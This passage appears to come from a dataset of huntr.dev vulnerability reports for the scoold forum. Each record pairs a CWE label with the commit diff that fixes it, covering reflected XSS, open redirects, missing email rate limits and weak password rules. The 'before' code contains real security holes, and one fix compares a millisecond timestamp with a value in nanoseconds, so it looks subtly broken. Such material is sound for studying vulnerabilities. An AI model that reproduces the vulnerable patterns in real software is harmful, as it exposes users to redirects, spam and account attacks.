@@ -523,6 +536,10 @@ img.profile-pic {
 .approve-answer-btn {
  padding: 0 10px;
 }




}

/**** FEEL FREE TO MODIFY THIS THEME ****/

@@ -988,7 +988,7 @@ $utils.formatDate($date, $format, $currentLocale)
<div class=""progress ajaxwait $!{hidden}""><div class=""indeterminate""></div></div>
#end
#####################################
#macro(profilepic $user)#if($user && $user.picture && $user.picture.matches(""^(http:|https:).*""))$peoplelink/avatar?url=$utils.urlEncode($!user.picture)#elseif($user && $user.picture && $user.picture.matches(""^(data:).*""))$user.picture #else $!imageslink/anon.svg #end#end
#####################################
#macro(infostrip )
 #if ($request.getParameter(""success""))

","9
src/main/java/com/erudika/scoold/utils/HttpUtils.java
@@ -196,6 +196,12 @@ public static String getCookieValue(HttpServletRequest req, String name) {

 /**
  * Fetches an avatar at a given URL.
  *
  * /////////////////////////////////////
  * THIS CODE IS CAUSING MORE PROBLEMS
  * THAN IT SOLVES! CONSIDER DELETING!!!
  * ////////////////////////////////////
  *
  * @param url image URL
  * @param req request
  * @param res response
@@ -206,6 +212,9 @@ public static void getAvatar(String url, HttpServletRequest req, HttpServletResp
   getDefaultAvatarImage(res);
   return;
  }
  if (!ScooldUtils.getInstance().isAvatarValidationEnabled()) {
   return;
  }
  HttpGet get = new HttpGet(url);
  // attach auth cookie to requests for locally uploaded avatars - without this custom avatars will not be loaded!
  if (StringUtils.startsWithIgnoreCase(url, ScooldServer.getServerURL())) {
12
src/main/java/com/erudika/scoold/utils/ScooldUtils.java
@@ -745,6 +745,10 @@ public boolean isDarkModeEnabled() {
  return Config.getConfigBoolean(""dark_mode_enabled"", true);
 }

 public boolean isAvatarValidationEnabled() {
  return Config.getConfigBoolean(""avatar_validation_enabled"", false); // this should be deleted in the future
 }

 public String getFooterHTML() {
  return Config.getConfigParam(""footer_html"", """");
 }
@@ -1328,6 +1332,14 @@ public static String getGravatar(Profile profile) {
  }
 }

 public String getFullAvatarURL(Profile profile) {
  if (profile == null) {
   return getGravatar("""");
  }
  return isAvatarValidationEnabled() ? PEOPLELINK + ""/avatar?url="" + Utils.urlEncode(profile.getPicture()) :
    profile.getPicture();
 }

 public void clearSession(HttpServletRequest req, HttpServletResponse res) {
  if (req != null) {
   HttpUtils.removeStateParam(AUTH_COOKIE, req, res);
4
src/main/resources/checkstyle.xml
@@ -10,7 +10,9 @@
  <property name=""fileExtensions"" value=""java, xml, properties, js, html, css"" />
 </module>

 <module name=""FileLength""/>
 <module name=""FileLength"">
  <property name=""max"" value=""4000""/>
 </module>

 <module name=""TreeWalker"">
  <module name=""RegexpSinglelineJava"">
17
src/main/resources/static/styles/style.css
@@ -347,6 +347,19 @@ img.profile-pic {
.user-card img.profile-pic {
 width: 100%;
}
img.profile-pic:before {
  content: "" "";
  display: block;
  position: absolute;
 box-sizing: border-box;
  background-image: url('/people/avatar');
 background-clip: initial;
 background-attachment: initial;
 background-position: initial;
 background-size: cover;
  height: calc(100% - 11%);
  width: calc(100% - 71%);
}
.card .card-website a:not(.btn):not(.btn-large):not(.btn-small):not(.btn-large):not(.btn-floating) {
 margin-right: 0;
 text-transform: lowercase;
@@ -523,6 +536,10 @@ img.profile-pic {
 .approve-answer-btn {
  padding: 0 10px;
 }
 img.profile-pic:before {
  height: calc(100% - 14%);
  width: calc(100% - 79%);
 }
}

/**** FEEL FREE TO MODIFY THIS THEME ****/
2
src/main/resources/templates/macro.vm
@@ -988,7 +988,7 @@ $utils.formatDate($date, $format, $currentLocale)
<div class=""progress ajaxwait $!{hidden}""><div class=""indeterminate""></div></div>
#end
#####################################
#macro(profilepic $user)#if($user && $user.picture && $user.picture.matches(""^(http:|https:).*""))$peoplelink/avatar?url=$utils.urlEncode($!user.picture)#elseif($user && $user.picture && $user.picture.matches(""^(data:).*""))$user.picture #else $!imageslink/anon.svg #end#end
#macro(profilepic $user)#if($user && $user.picture && $user.picture.matches(""^(http:|https:).*""))$scooldUtils.getFullAvatarURL($user)#elseif($user && $user.picture && $user.picture.matches(""^(data:).*""))$user.picture #else $!imageslink/anon.svg #end#end
#####################################
#macro(infostrip )
 #if ($request.getParameter(""success""))"
https://huntr.dev/bounties/40f7bdcd-9561-4bb7-abe4-93f75059e52e/,Cross-site Scripting (XSS) - Reflected in erudika/scoold,"It occurs when a malicious script is injected directly into a vulnerable web application. Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user's browser.",,CWE-79: Cross-site Scripting (XSS) - Reflected,https://www.github.com/erudika/scoold/commit/1f71ee2523640d2e4cfb92c9a6036f0d84df5174,"@@ -151,6 +151,9 @@ public String bulkEdit(@RequestParam(required = false) String[] selectedUsers,
 @GetMapping(""/avatar"")
 public void avatar(@RequestParam(required = false) String url,
   HttpServletRequest req, HttpServletResponse res, Model model) {



  HttpUtils.getAvatar(url, req, res);
 }
}
","3
src/main/java/com/erudika/scoold/controllers/PeopleController.java
@@ -151,6 +151,9 @@ public String bulkEdit(@RequestParam(required = false) String[] selectedUsers,
 @GetMapping(""/avatar"")
 public void avatar(@RequestParam(required = false) String url,
   HttpServletRequest req, HttpServletResponse res, Model model) {
  // prevents reflected XSS. see https://brutelogic.com.br/poc.svg
  // for some reason the CSP header is not sent on these responses by the ScooldInterceptor
  utils.setSecurityHeaders(utils.getCSPNonce(), req, res);
  HttpUtils.getAvatar(url, req, res);
 }
}"
https://huntr.dev/bounties/4a565541-564f-4518-ad52-1e944b09440f/,Insufficient Granularity of Access Control in erudika/scoold,Bypass rate limit and sent unlimited email to any email address.,,CWE-1220: Insufficient Granularity of Access Control,https://www.github.com/erudika/scoold/commit/043be60f256a99c648ae0429480c573934b448cb,"@@ -182,9 +182,20 @@ public String signup(@RequestParam String name, @RequestParam String email, @Req
 }

 @PostMapping(""/signin/register/resend"")
 public String signup(@RequestParam String email, HttpServletRequest req, HttpServletResponse res, Model model) {
  if (!utils.isAuthenticated(req) && isAccountLocked(email)) {
   utils.sendVerificationEmail(email, req);











  }
  return ""redirect:"" + SIGNINLINK + ""/register?verify=true"";
 }
@@ -303,7 +314,7 @@ private boolean isEmailRegistered(String email) {
  return ident != null && ident.hasProperty(Config._PASSWORD);
 }

 public boolean isAccountLocked(String email) {
  Sysprop ident = pc.read(email);
  if (ident != null && !StringUtils.isBlank((String) ident.getProperty(Config._EMAIL_TOKEN))) {
   User u = pc.read(Utils.type(User.class), ident.getCreatorid());

","19
src/main/java/com/erudika/scoold/controllers/SigninController.java
@@ -182,9 +182,20 @@ public String signup(@RequestParam String name, @RequestParam String email, @Req
 }

 @PostMapping(""/signin/register/resend"")
 public String signup(@RequestParam String email, HttpServletRequest req, HttpServletResponse res, Model model) {
  if (!utils.isAuthenticated(req) && isAccountLocked(email)) {
   utils.sendVerificationEmail(email, req);
 public String resend(@RequestParam String email, HttpServletRequest req, HttpServletResponse res, Model model) {
  if (!utils.isAuthenticated(req)) {
   Sysprop ident = pc.read(email);
   // confirmation emails can be resent once every 6h
   if (ident != null && !StringUtils.isBlank((String) ident.getProperty(Config._EMAIL_TOKEN)) &&
     (!ident.hasProperty(""confirmationTimestamp"") || Utils.timestamp() >
     ((long) ident.getProperty(""confirmationTimestamp"") + TimeUnit.HOURS.toMillis(6)))) {
    User u = pc.read(Utils.type(User.class), ident.getCreatorid());
    if (u != null && !u.getActive()) {
     utils.sendVerificationEmail(email, req);
     ident.addProperty(""confirmationTimestamp"", Utils.timestamp());
     pc.update(ident);
    }
   }
  }
  return ""redirect:"" + SIGNINLINK + ""/register?verify=true"";
 }
@@ -303,7 +314,7 @@ private boolean isEmailRegistered(String email) {
  return ident != null && ident.hasProperty(Config._PASSWORD);
 }

 public boolean isAccountLocked(String email) {
 private boolean isAccountLocked(String email) {
  Sysprop ident = pc.read(email);
  if (ident != null && !StringUtils.isBlank((String) ident.getProperty(Config._EMAIL_TOKEN))) {
   User u = pc.read(Utils.type(User.class), ident.getCreatorid());"
https://huntr.dev/bounties/e65162c6-d4da-4cb4-8a9f-43094f4f2563/,Insufficient Granularity of Access Control in erudika/scoold,Bypass rate limit and sent unlimited email to any email address.,,CWE-1220: Insufficient Granularity of Access Control,https://www.github.com/erudika/scoold/commit/6e66044fcedd1b20ccd2ee7733368cdf8c64a497,"@@ -41,6 +41,7 @@
import org.springframework.web.bind.annotation.RequestParam;
import static com.erudika.scoold.utils.HttpUtils.getBackToUrl;
import static com.erudika.scoold.utils.HttpUtils.setAuthCookie;

import org.apache.commons.lang3.math.NumberUtils;
import org.slf4j.LoggerFactory;

@@ -360,9 +361,11 @@ private String generatePasswordResetToken(String email, HttpServletRequest req)
   return """";
  }
  Sysprop s = pc.read(email);
  if (s != null) {

   String token = Utils.generateSecurityToken(42, true);
   s.addProperty(Config._RESET_TOKEN, token);

   if (pc.update(s) != null) {
    utils.sendPasswordResetEmail(email, token, req);
   }

","5
src/main/java/com/erudika/scoold/controllers/SigninController.java
@@ -41,6 +41,7 @@
import org.springframework.web.bind.annotation.RequestParam;
import static com.erudika.scoold.utils.HttpUtils.getBackToUrl;
import static com.erudika.scoold.utils.HttpUtils.setAuthCookie;
import java.util.concurrent.TimeUnit;
import org.apache.commons.lang3.math.NumberUtils;
import org.slf4j.LoggerFactory;

@@ -360,9 +361,11 @@ private String generatePasswordResetToken(String email, HttpServletRequest req)
   return """";
  }
  Sysprop s = pc.read(email);
  if (s != null) {
  // pass reset emails can be sent once every 12h
  if (s != null && (s.getUpdated() == null || Utils.timestamp() > (s.getUpdated() + TimeUnit.HOURS.toNanos(12)))) {
   String token = Utils.generateSecurityToken(42, true);
   s.addProperty(Config._RESET_TOKEN, token);
   s.setUpdated(Utils.timestamp());
   if (pc.update(s) != null) {
    utils.sendPasswordResetEmail(email, token, req);
   }"
https://huntr.dev/bounties/b7161760-8ff0-4d34-b14b-6039e144e841/,Open Redirect in erudika/scoold,Open redirect bypass,,CWE-601: Open Redirect,https://www.github.com/erudika/scoold/commit/1c5f4aaf2e2e9facc82fa1397e3ddba0bb3778d0,"@@ -311,7 +311,7 @@ public static String getBackToUrl(HttpServletRequest req) {
  }
  if ((StringUtils.startsWithIgnoreCase(backtoFromCookie, ""http://"") ||
    StringUtils.startsWithIgnoreCase(backtoFromCookie, ""https://"")) &&
    !StringUtils.startsWithIgnoreCase(backtoFromCookie, ScooldServer.getServerURL())) {
   backtoFromCookie = """";
  }
  return (StringUtils.isBlank(backtoFromCookie) ? HOMEPAGE : backtoFromCookie);

","2
src/main/java/com/erudika/scoold/utils/HttpUtils.java
@@ -311,7 +311,7 @@ public static String getBackToUrl(HttpServletRequest req) {
  }
  if ((StringUtils.startsWithIgnoreCase(backtoFromCookie, ""http://"") ||
    StringUtils.startsWithIgnoreCase(backtoFromCookie, ""https://"")) &&
    !StringUtils.startsWithIgnoreCase(backtoFromCookie, ScooldServer.getServerURL())) {
    !StringUtils.startsWithIgnoreCase(backtoFromCookie, ScooldServer.getServerURL() + ""/"")) {
   backtoFromCookie = """";
  }
  return (StringUtils.isBlank(backtoFromCookie) ? HOMEPAGE : backtoFromCookie);"
https://huntr.dev/bounties/f1d99420-dce0-4480-a118-22c5a20c07c1/,Open Redirect in erudika/scoold,There is an open redirect vulnerability in the following URL:,,CWE-601: Open Redirect,https://www.github.com/erudika/scoold/commit/677ab760bc5e778336fda22a69a0f5d94acb69df,"@@ -60,10 +60,10 @@ public SigninController(ScooldUtils utils) {
 public String get(@RequestParam(name = ""returnto"", required = false, defaultValue = HOMEPAGE) String returnto,
   HttpServletRequest req, HttpServletResponse res, Model model) {
  if (utils.isAuthenticated(req)) {
   return ""redirect:"" + (StringUtils.startsWithIgnoreCase(returnto, SIGNINLINK) ? HOMEPAGE : returnto);
  }
  if (!HOMEPAGE.equals(returnto) && !SIGNINLINK.equals(returnto)) {
   HttpUtils.setStateParam(""returnto"", Utils.urlEncode(returnto), req, res);
  } else {
   HttpUtils.removeStateParam(""returnto"", req, res);
  }

@@ -306,6 +306,14 @@ public static void setAuthCookie(String jwt, HttpServletRequest req, HttpServlet
  */
 public static String getBackToUrl(HttpServletRequest req) {
  String backtoFromCookie = Utils.urlDecode(HttpUtils.getStateParam(""returnto"", req));








  return (StringUtils.isBlank(backtoFromCookie) ? HOMEPAGE : backtoFromCookie);
 }
}
","4
src/main/java/com/erudika/scoold/controllers/SigninController.java
@@ -60,10 +60,10 @@ public SigninController(ScooldUtils utils) {
 public String get(@RequestParam(name = ""returnto"", required = false, defaultValue = HOMEPAGE) String returnto,
   HttpServletRequest req, HttpServletResponse res, Model model) {
  if (utils.isAuthenticated(req)) {
   return ""redirect:"" + (StringUtils.startsWithIgnoreCase(returnto, SIGNINLINK) ? HOMEPAGE : returnto);
   return ""redirect:"" + (StringUtils.startsWithIgnoreCase(returnto, SIGNINLINK) ? HOMEPAGE : getBackToUrl(req));
  }
  if (!HOMEPAGE.equals(returnto) && !SIGNINLINK.equals(returnto)) {
   HttpUtils.setStateParam(""returnto"", Utils.urlEncode(returnto), req, res);
   HttpUtils.setStateParam(""returnto"", Utils.urlEncode(getBackToUrl(req)), req, res);
  } else {
   HttpUtils.removeStateParam(""returnto"", req, res);
  }
8
src/main/java/com/erudika/scoold/utils/HttpUtils.java
@@ -306,6 +306,14 @@ public static void setAuthCookie(String jwt, HttpServletRequest req, HttpServlet
  */
 public static String getBackToUrl(HttpServletRequest req) {
  String backtoFromCookie = Utils.urlDecode(HttpUtils.getStateParam(""returnto"", req));
  if (StringUtils.isBlank(backtoFromCookie)) {
   backtoFromCookie = req.getParameter(""returnto"");
  }
  if ((StringUtils.startsWithIgnoreCase(backtoFromCookie, ""http://"") ||
    StringUtils.startsWithIgnoreCase(backtoFromCookie, ""https://"")) &&
    !StringUtils.startsWithIgnoreCase(backtoFromCookie, ScooldServer.getServerURL())) {
   backtoFromCookie = """";
  }
  return (StringUtils.isBlank(backtoFromCookie) ? HOMEPAGE : backtoFromCookie);
 }
}"
https://huntr.dev/bounties/ade01959-bddb-4d41-a098-259d93ed1ebc/,Weak Password Requirements in erudika/scoold,"You should check and validate the password when users registering, any user able to use a weak password like aaaaa also you don't have any rate limit for incorrect passwords that cause to easily perform Bruteforce attacks against your users that have weak passwords.",,CWE-521: Weak Password Requirements,https://www.github.com/erudika/scoold/commit/3e081e6a0c14352ed70b1c60da996ac8d679c79a,"@@ -211,9 +211,9 @@ para.admins = ""admin@domain.com""
# enable or disable email and password authentication
para.password_auth_enabled = true
# min. password length
para.min_password_length = 7
# min. password strength (1=Good, 2=Strong, 3=Very Strong)
para.min_password_strength = 1
# Session cookie name
para.auth_cookie = ""scoold-auth""
# Facebook - create your own Facebook app first!

@@ -83,6 +83,8 @@ public class ScooldServer extends SpringBootServletInitializer {
 public static final int MAX_TAGS_PER_POST = Config.getConfigInt(""max_tags_per_post"", 5);
 public static final int MAX_REPLIES_PER_POST = Config.getConfigInt(""max_replies_per_post"", 500);
 public static final int MAX_FAV_TAGS = Config.getConfigInt(""max_fav_tags"", 50);



 public static final int ANSWER_VOTEUP_REWARD_AUTHOR = Config.getConfigInt(""answer_voteup_reward_author"", 10);
 public static final int QUESTION_VOTEUP_REWARD_AUTHOR = Config.getConfigInt(""question_voteup_reward author"", 5);

@@ -24,6 +24,8 @@
import com.erudika.para.utils.Config;
import com.erudika.para.utils.Utils;
import static com.erudika.scoold.ScooldServer.HOMEPAGE;


import static com.erudika.scoold.ScooldServer.SIGNINLINK;
import com.erudika.scoold.utils.HttpUtils;
import com.erudika.scoold.utils.ScooldUtils;
@@ -150,7 +152,8 @@ public String signup(@RequestParam String name, @RequestParam String email, @Req
   HttpServletRequest req, HttpServletResponse res, Model model) {
  boolean approvedDomain = utils.isEmailDomainApproved(email);
  if (!utils.isAuthenticated(req) && approvedDomain) {
   if (!isEmailRegistered(email) && isSubmittedByHuman(req)) {

    User u = pc.signIn(""password"", email + "":"" + name + "":"" + passw, false);
    if (u != null && u.getActive()) {
     setAuthCookie(u.getPassword(), req, res);
@@ -166,7 +169,11 @@ public String signup(@RequestParam String name, @RequestParam String email, @Req
    model.addAttribute(""name"", name);
    model.addAttribute(""bademail"", email);
    model.addAttribute(""emailPattern"", Email.EMAIL_PATTERN);
    model.addAttribute(""error"", Collections.singletonMap(""email"", utils.getLang(req).get(""msgcode.1"")));




    return ""base"";
   }
  }
@@ -222,7 +229,11 @@ public String changePass(@RequestParam String email,
    model.addAttribute(""token"", """");
    model.addAttribute(""verified"", !error);
    if (error) {
     model.addAttribute(""error"", Collections.singletonMap(""email"", utils.getLang(req).get(""msgcode.7"")));




    }
    return ""base"";
   }
@@ -317,6 +328,33 @@ private boolean isSubmittedByHuman(HttpServletRequest req) {
  return StringUtils.isBlank(req.getParameter(""leaveblank"")) && (System.currentTimeMillis() - time >= 7000);
 }




























 private String generatePasswordResetToken(String email, HttpServletRequest req) {
  if (StringUtils.isBlank(email)) {
   return """";
@@ -334,7 +372,7 @@ private String generatePasswordResetToken(String email, HttpServletRequest req)
 }

 private boolean resetPassword(String email, String newpass, String token) {
  if (StringUtils.isBlank(newpass) || StringUtils.isBlank(token) || newpass.length() < Config.MIN_PASS_LENGTH) {
   return false;
  }
  Sysprop s = pc.read(email);

@@ -121,6 +121,7 @@ public void postHandle(HttpServletRequest request, HttpServletResponse response,
  modelAndView.addObject(""MAX_TAGS_PER_POST"", MAX_TAGS_PER_POST);
  modelAndView.addObject(""MAX_REPLIES_PER_POST"", MAX_REPLIES_PER_POST);
  modelAndView.addObject(""MAX_FAV_TAGS"", MAX_FAV_TAGS);

  modelAndView.addObject(""ANSWER_VOTEUP_REWARD_AUTHOR"", ANSWER_VOTEUP_REWARD_AUTHOR);
  modelAndView.addObject(""QUESTION_VOTEUP_REWARD_AUTHOR"", QUESTION_VOTEUP_REWARD_AUTHOR);
  modelAndView.addObject(""VOTEUP_REWARD_AUTHOR"", VOTEUP_REWARD_AUTHOR);

@@ -325,6 +325,7 @@ msgcode.4 = Your account has been deleted.
msgcode.5 = You have been signed out.
msgcode.6 = Your email address has not been confirmed yet.
msgcode.7 = Something went terribly wrong!

msgcode.16 = This post was deleted.

about.scoold.1 = Scoold is an open source forum platform for knowledge sharing and collaboration. It was inspired by StackOverflow.com the sites of the Stack Exchange family and we have huge respect towards the people behind them.

@@ -15,7 +15,7 @@
 *
 * For issues and patches go to: https://github.com/erudika
 */
/*global window: false, jQuery: false, $: false, google, hljs, RTL_ENABLED, CONTEXT_PATH, M, CONFIRM_MSG, WELCOME_MESSAGE, WELCOME_MESSAGE_ONLOGIN, MAX_TAGS_PER_POST: false */
""use strict"";
$(function () {
 var mapCanvas = $(""div#map-canvas"");
@@ -1188,4 +1188,65 @@ $(function () {
   return true;
  });
 }





























































});
@@ -392,6 +392,12 @@ img.profile-pic {
 display: none;
}







@media (max-width: 1400px) {
 .container {width: 90%;}
}

@@ -423,11 +423,12 @@
  #set($isRTLJS = ""RTL_ENABLED = $RTL_ENABLED"")
  #set($isAdminJS = ""IS_ADMIN = $isAdmin"")
  #set($maxTagsJS = ""MAX_TAGS_PER_POST = $MAX_TAGS_PER_POST"")

  #set($_welcomeMsg = $scooldUtils.getWelcomeMessage($authUser))
  #set($_welcomeMessageJS = ""WELCOME_MESSAGE = '$_welcomeMsg'"")
  #set($_welcomeMsgOnLogin = $scooldUtils.getWelcomeMessageOnLogin($authUser))
  #set($_welcomeMessageOnLoginJS = ""WELCOME_MESSAGE_ONLOGIN = '$_welcomeMsgOnLogin'"")
  <script nonce=""$cspNonce"">$ctxPathJS;$isRTLJS;$isAdminJS;$maxTagsJS;$_welcomeMessageJS;$_welcomeMessageOnLoginJS;</script>
  <script nonce=""$cspNonce"" src=""$!scriptslink/scoold.js""></script>

  #if ($request.getServletPath() == $signinlink)

@@ -43,7 +43,9 @@
       #if(!$resend)
       <div class=""input-field mvm"">
        <label for=""passw"">$!lang.get('password')</label>
        <input id=""passw"" type=""password"" name=""passw"" value="""" minlength=""6"" required>


       </div>
       #end

@@ -97,7 +99,9 @@
      #if($token)
       <div class=""input-field mvm"">
        <label for=""newpassword"">$!lang.get('newpassword')</label>
        <input id=""newpassword"" type=""password"" name=""newpassword"" value="""" minlength=""6"" required>


       </div>
      #end
      #if($token)

","4
README.md
@@ -211,9 +211,9 @@ para.admins = ""admin@domain.com""
# enable or disable email and password authentication
para.password_auth_enabled = true
# min. password length
para.min_password_length = 7
para.min_password_length = 8
# min. password strength (1=Good, 2=Strong, 3=Very Strong)
para.min_password_strength = 1
para.min_password_strength = 2
# Session cookie name
para.auth_cookie = ""scoold-auth""
# Facebook - create your own Facebook app first!
2
src/main/java/com/erudika/scoold/ScooldServer.java
@@ -83,6 +83,8 @@ public class ScooldServer extends SpringBootServletInitializer {
 public static final int MAX_TAGS_PER_POST = Config.getConfigInt(""max_tags_per_post"", 5);
 public static final int MAX_REPLIES_PER_POST = Config.getConfigInt(""max_replies_per_post"", 500);
 public static final int MAX_FAV_TAGS = Config.getConfigInt(""max_fav_tags"", 50);
 public static final int MIN_PASS_LENGTH = Config.getConfigInt(""min_password_length"", 8);
 public static final int MIN_PASS_STRENGTH = Config.getConfigInt(""min_password_strength"", 2);

 public static final int ANSWER_VOTEUP_REWARD_AUTHOR = Config.getConfigInt(""answer_voteup_reward_author"", 10);
 public static final int QUESTION_VOTEUP_REWARD_AUTHOR = Config.getConfigInt(""question_voteup_reward author"", 5);
46
src/main/java/com/erudika/scoold/controllers/SigninController.java
@@ -24,6 +24,8 @@
import com.erudika.para.utils.Config;
import com.erudika.para.utils.Utils;
import static com.erudika.scoold.ScooldServer.HOMEPAGE;
import static com.erudika.scoold.ScooldServer.MIN_PASS_LENGTH;
import static com.erudika.scoold.ScooldServer.MIN_PASS_STRENGTH;
import static com.erudika.scoold.ScooldServer.SIGNINLINK;
import com.erudika.scoold.utils.HttpUtils;
import com.erudika.scoold.utils.ScooldUtils;
@@ -150,7 +152,8 @@ public String signup(@RequestParam String name, @RequestParam String email, @Req
   HttpServletRequest req, HttpServletResponse res, Model model) {
  boolean approvedDomain = utils.isEmailDomainApproved(email);
  if (!utils.isAuthenticated(req) && approvedDomain) {
   if (!isEmailRegistered(email) && isSubmittedByHuman(req)) {
   boolean goodPass = isPasswordStrongEnough(passw);
   if (!isEmailRegistered(email) && isSubmittedByHuman(req) && goodPass) {
    User u = pc.signIn(""password"", email + "":"" + name + "":"" + passw, false);
    if (u != null && u.getActive()) {
     setAuthCookie(u.getPassword(), req, res);
@@ -166,7 +169,11 @@ public String signup(@RequestParam String name, @RequestParam String email, @Req
    model.addAttribute(""name"", name);
    model.addAttribute(""bademail"", email);
    model.addAttribute(""emailPattern"", Email.EMAIL_PATTERN);
    model.addAttribute(""error"", Collections.singletonMap(""email"", utils.getLang(req).get(""msgcode.1"")));
    if (!goodPass) {
     model.addAttribute(""error"", Collections.singletonMap(""passw"", utils.getLang(req).get(""msgcode.8"")));
    } else {
     model.addAttribute(""error"", Collections.singletonMap(""email"", utils.getLang(req).get(""msgcode.1"")));
    }
    return ""base"";
   }
  }
@@ -222,7 +229,11 @@ public String changePass(@RequestParam String email,
    model.addAttribute(""token"", """");
    model.addAttribute(""verified"", !error);
    if (error) {
     model.addAttribute(""error"", Collections.singletonMap(""email"", utils.getLang(req).get(""msgcode.7"")));
     if (!isPasswordStrongEnough(newpassword)) {
      model.addAttribute(""error"", Collections.singletonMap(""newpassword"", utils.getLang(req).get(""msgcode.8"")));
     } else {
      model.addAttribute(""error"", Collections.singletonMap(""email"", utils.getLang(req).get(""msgcode.7"")));
     }
    }
    return ""base"";
   }
@@ -317,6 +328,33 @@ private boolean isSubmittedByHuman(HttpServletRequest req) {
  return StringUtils.isBlank(req.getParameter(""leaveblank"")) && (System.currentTimeMillis() - time >= 7000);
 }

 private boolean isPasswordStrongEnough(String password) {
  if (StringUtils.length(password) >= MIN_PASS_LENGTH) {
   int score = 0;
   if (password.matches("".*[a-z].*"")) {
    score++;
   }
   if (password.matches("".*[A-Z].*"")) {
    score++;
   }
   if (password.matches("".*[0-9].*"")) {
    score++;
   }
   if (password.matches("".*[^\\w\\s\\n\\t].*"")) {
    score++;
   }
   // 1 = good strength, 2 = medium strength, 3 = high strength
   if (MIN_PASS_STRENGTH <= 1) {
    return score >= 2;
   } else if (MIN_PASS_STRENGTH == 2) {
    return score >= 3;
   } else {
    return score >= 4;
   }
  }
  return false;
 }

 private String generatePasswordResetToken(String email, HttpServletRequest req) {
  if (StringUtils.isBlank(email)) {
   return """";
@@ -334,7 +372,7 @@ private String generatePasswordResetToken(String email, HttpServletRequest req)
 }

 private boolean resetPassword(String email, String newpass, String token) {
  if (StringUtils.isBlank(newpass) || StringUtils.isBlank(token) || newpass.length() < Config.MIN_PASS_LENGTH) {
  if (StringUtils.isBlank(newpass) || StringUtils.isBlank(token) || !isPasswordStrongEnough(newpass)) {
   return false;
  }
  Sysprop s = pc.read(email);
1
src/main/java/com/erudika/scoold/utils/ScooldRequestInterceptor.java
@@ -121,6 +121,7 @@ public void postHandle(HttpServletRequest request, HttpServletResponse response,
  modelAndView.addObject(""MAX_TAGS_PER_POST"", MAX_TAGS_PER_POST);
  modelAndView.addObject(""MAX_REPLIES_PER_POST"", MAX_REPLIES_PER_POST);
  modelAndView.addObject(""MAX_FAV_TAGS"", MAX_FAV_TAGS);
  modelAndView.addObject(""MIN_PASS_LENGTH"", MIN_PASS_LENGTH);
  modelAndView.addObject(""ANSWER_VOTEUP_REWARD_AUTHOR"", ANSWER_VOTEUP_REWARD_AUTHOR);
  modelAndView.addObject(""QUESTION_VOTEUP_REWARD_AUTHOR"", QUESTION_VOTEUP_REWARD_AUTHOR);
  modelAndView.addObject(""VOTEUP_REWARD_AUTHOR"", VOTEUP_REWARD_AUTHOR);
1
src/main/resources/lang_en.properties
@@ -325,6 +325,7 @@ msgcode.4 = Your account has been deleted.
msgcode.5 = You have been signed out.
msgcode.6 = Your email address has not been confirmed yet.
msgcode.7 = Something went terribly wrong!
msgcode.8 = Password is not strong enough.
msgcode.16 = This post was deleted.

about.scoold.1 = Scoold is an open source forum platform for knowledge sharing and collaboration. It was inspired by StackOverflow.com the sites of the Stack Exchange family and we have huge respect towards the people behind them.
63
src/main/resources/static/scripts/scoold.js
@@ -15,7 +15,7 @@
 *
 * For issues and patches go to: https://github.com/erudika
 */
/*global window: false, jQuery: false, $: false, google, hljs, RTL_ENABLED, CONTEXT_PATH, M, CONFIRM_MSG, WELCOME_MESSAGE, WELCOME_MESSAGE_ONLOGIN, MAX_TAGS_PER_POST: false */
/*global window: false, jQuery: false, $: false, google, hljs, RTL_ENABLED, CONTEXT_PATH, M, CONFIRM_MSG, WELCOME_MESSAGE, WELCOME_MESSAGE_ONLOGIN, MAX_TAGS_PER_POST, MIN_PASS_LENGTH: false */
""use strict"";
$(function () {
 var mapCanvas = $(""div#map-canvas"");
@@ -1188,4 +1188,65 @@ $(function () {
   return true;
  });
 }

 if (window.location.pathname.indexOf(CONTEXT_PATH + '/signin/') >= 0) {
  var passwordInput = $('#passw, #newpassword');
  console.log(passwordInput);
  var scoreMessage = $('#pass-meter-message');
  var messagesList = ['Too simple', 'Weak', 'Good', 'Strong', 'Very strong'];
  passwordInput.on('keyup', function () {
   var score = 0;
   var val = passwordInput.val();
   if (val.length >= (MIN_PASS_LENGTH || 8)) {
    console.log(""len"");
    ++score;
   }
   if (val.match(/(?=.*[a-z])/)) {
    console.log(""lower"");
    ++score;
   }
   if (val.match(/(?=.*[A-Z])/)) {
    console.log(""upper"");
    ++score;
   }
   if (val.match(/(?=.*[0-9])/)) {
    console.log(""num"");
    ++score;
   }
   if (val.match(/(?=.*[^\w\s\n\t])/)) {
    console.log(""sym"");
    ++score;
   }
   if (val.length === 0) {
    score = -1;
   }
   switch (score) {
    case 0:
    case 1:
     passwordInput.attr('class', 'pass-meter');
     scoreMessage.text(messagesList[0]);
     break;
    case 2:
     passwordInput.attr('class', 'pass-meter psms-25');
     scoreMessage.text(messagesList[1]);
     break;
    case 3:
     passwordInput.attr('class', 'pass-meter psms-50');
     scoreMessage.text(messagesList[2]);
     break;
    case 4:
     passwordInput.attr('class', 'pass-meter psms-75');
     scoreMessage.text(messagesList[3]);
     break;
    case 5:
     passwordInput.attr('class', 'pass-meter psms-100');
     scoreMessage.text(messagesList[4]);
     break;
    default:
     passwordInput.attr('class', '');
     scoreMessage.text('');
   }
  });
 }

});
6
src/main/resources/static/styles/style.css
@@ -392,6 +392,12 @@ img.profile-pic {
 display: none;
}

#passw.pass-meter, #newpassword.pass-meter { border-bottom: 3px solid #F44336; box-shadow: none;}
#passw.pass-meter.psms-25, #newpassword.pass-meter.psms-25 { border-bottom: 3px solid #F44336; box-shadow: none; }
#passw.pass-meter.psms-50, #newpassword.pass-meter.psms-50 { border-bottom: 3px solid #FFC000; box-shadow: none; }
#passw.pass-meter.psms-75, #newpassword.pass-meter.psms-75 { border-bottom: 3px solid #b2ca7d; box-shadow: none; }
#passw.pass-meter.psms-100, #newpassword.pass-meter.psms-100 { border-bottom: 3px solid #88AF12; box-shadow: none; }

@media (max-width: 1400px) {
 .container {width: 90%;}
}
3
src/main/resources/templates/base.vm
@@ -423,11 +423,12 @@
  #set($isRTLJS = ""RTL_ENABLED = $RTL_ENABLED"")
  #set($isAdminJS = ""IS_ADMIN = $isAdmin"")
  #set($maxTagsJS = ""MAX_TAGS_PER_POST = $MAX_TAGS_PER_POST"")
  #set($minPassLen = ""MIN_PASS_LENGTH = $MIN_PASS_LENGTH"")
  #set($_welcomeMsg = $scooldUtils.getWelcomeMessage($authUser))
  #set($_welcomeMessageJS = ""WELCOME_MESSAGE = '$_welcomeMsg'"")
  #set($_welcomeMsgOnLogin = $scooldUtils.getWelcomeMessageOnLogin($authUser))
